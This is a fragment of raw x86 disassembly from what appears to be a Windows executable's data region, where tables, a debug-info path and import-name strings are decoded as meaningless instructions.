  420f23:	add    BYTE PTR [edx-0x69ffbdf2],dl
  420f29:	push   cs
  420f2a:	inc    edx
  420f2b:	add    BYTE PTR [edx-0x61ffbdf2],bl
  420f31:	push   cs
  420f32:	inc    edx
  420f33:	add    BYTE PTR [edx+0x5800420e],ah
  420f39:	cmovb  eax,DWORD PTR [eax]
  420f3c:	pop    esp
  420f3d:	cmovb  eax,DWORD PTR [eax]
  420f40:	pusha  
  420f41:	cmovb  eax,DWORD PTR [eax]
  420f44:	cmovb  eax,DWORD PTR fs:[eax]
  420f48:	push   0x6c00420f
  420f4d:	cmovb  eax,DWORD PTR [eax]
  420f50:	jo     0x420f61
  420f52:	inc    edx
  420f53:	add    BYTE PTR [edi+ecx*1+0x42],dh
  420f57:	add    al,cl
  420f59:	cmp    edx,DWORD PTR [eax]
  420f5b:	add    BYTE PTR [ecx+0x25],dh
  420f5e:	adc    BYTE PTR [eax],al
  420f60:	fld    TBYTE PTR [ecx]
  420f62:	adc    BYTE PTR [eax],al
  420f64:	xchg   edi,eax
  420f65:	sub    al,0x10
  420f67:	add    dh,ah
  420f69:	aaa    
  420f6a:	adc    BYTE PTR [eax],al
  420f6c:	and    eax,0xd5001051
  420f71:	xor    dl,BYTE PTR [eax]
  420f73:	add    BYTE PTR [eax-0x13ffefd8],ch
  420f79:	push   cs
  420f7a:	inc    edx
  420f7b:	add    al,dh
  420f7d:	push   cs
  420f7e:	inc    edx
  420f7f:	add    ah,dh
  420f81:	push   cs
  420f82:	inc    edx
  420f83:	add    al,bh
  420f85:	push   cs
  420f86:	inc    edx
  420f87:	add    ah,bh
  420f89:	push   cs
  420f8a:	inc    edx
  420f8b:	add    BYTE PTR [eax],al
  420f8d:	cmovb  eax,DWORD PTR [eax]
  420f90:	add    al,0xf
  420f92:	inc    edx
  420f93:	add    BYTE PTR [eax],cl
  420f95:	cmovb  eax,DWORD PTR [eax]
  420f98:	adc    DWORD PTR [ebp+0x10],ebx
  420f9b:	add    bh,cl
  420f9d:	push   es
  420f9e:	adc    BYTE PTR [eax],al
  420fa0:	xchg   esp,eax
  420fa1:	xor    eax,0x7b780010
  420fa6:	adc    BYTE PTR [eax],al
  420fa8:	stos   BYTE PTR es:[edi],al
  420fa9:	jo     0x420fbb
  420fab:	add    BYTE PTR [eax],ch
  420fad:	inc    esp
  420fae:	adc    BYTE PTR [eax],al
  420fb0:	pop    ebp
  420fb1:	pop    ecx
  420fb2:	adc    BYTE PTR [eax],al
  420fb4:	fild   QWORD PTR [edi]
  420fb6:	adc    BYTE PTR [eax],al
	...
  420fc0:	push   edx
  420fc1:	push   ebx
  420fc2:	inc    esp
  420fc3:	push   ebx
  420fc4:	cmp    bh,ch
  420fc6:	and    eax,0xfdd39237
  420fcb:	inc    esi
  420fcc:	add    DWORD PTR [esi+esi*2+0x6cb8fdb3],0x194
  420fd7:	add    BYTE PTR [ebx+0x3a],al
  420fda:	pop    esp
  420fdb:	inc    ebx
  420fdc:	jne    0x421050
  420fde:	jb     0x421045
  420fe0:	outs   dx,BYTE PTR ds:[esi]
  420fe1:	je     0x421027
  420fe3:	popa   
  420fe4:	je     0x421047
  420fe6:	pop    esp
  420fe7:	dec    ebp
  420fe8:	outs   dx,DWORD PTR ds:[esi]
  420fe9:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  420ff1:	ins    BYTE PTR es:[edi],dx
  420ff2:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  420ff9:	dec    esi
  420ffa:	gs ja  0x420ffd
  420ffd:	add    BYTE PTR [eax],al
  420fff:	add    BYTE PTR [eax],al
  421001:	add    BYTE PTR [eax],al
  421003:	add    BYTE PTR [edx-0x2c],cl
  421006:	mov    bl,0x4d
  421008:	add    BYTE PTR [eax],al
  42100a:	add    BYTE PTR [eax],al
  42100c:	xor    dl,BYTE PTR [eax]
  42100e:	add    al,BYTE PTR [eax]
  421010:	add    DWORD PTR [eax],eax
  421012:	add    BYTE PTR [eax],al
  421014:	add    DWORD PTR [eax],eax
  421016:	add    BYTE PTR [eax],al
  421018:	add    DWORD PTR [eax],eax
  42101a:	add    BYTE PTR [eax],al
  42101c:	sub    BYTE PTR [eax],dl
  42101e:	add    al,BYTE PTR [eax]
  421020:	sub    al,0x10
  421022:	add    al,BYTE PTR [eax]
  421024:	xor    BYTE PTR [eax],dl
  421026:	add    al,BYTE PTR [eax]
  421028:	mov    edi,0x3e000020
  42102d:	adc    BYTE PTR [edx],al
  42102f:	add    BYTE PTR [eax],al
  421031:	add    BYTE PTR [ebx+0x79],dl
  421034:	ins    DWORD PTR es:[edi],dx
  421035:	bound  ebp,QWORD PTR [edi+0x6c]
  421038:	imul   esp,DWORD PTR [ebx+0x45],0x3f006578
  42103f:	inc    ebx
  421040:	ins    BYTE PTR es:[edi],dx
  421041:	outs   dx,DWORD PTR ds:[esi]
  421042:	jae    0x4210a9
  421044:	push   edi
  421045:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  42104c:	popa   
  42104d:	je     0x4210b8
  42104f:	outs   dx,DWORD PTR ds:[esi]
  421050:	outs   dx,BYTE PTR ds:[esi]
  421051:	inc    ebx
  421052:	ins    BYTE PTR es:[edi],dx
  421053:	outs   dx,DWORD PTR ds:[esi]
  421054:	jae    0x4210bb
  421056:	push   edi
  421057:	.byte 0x69
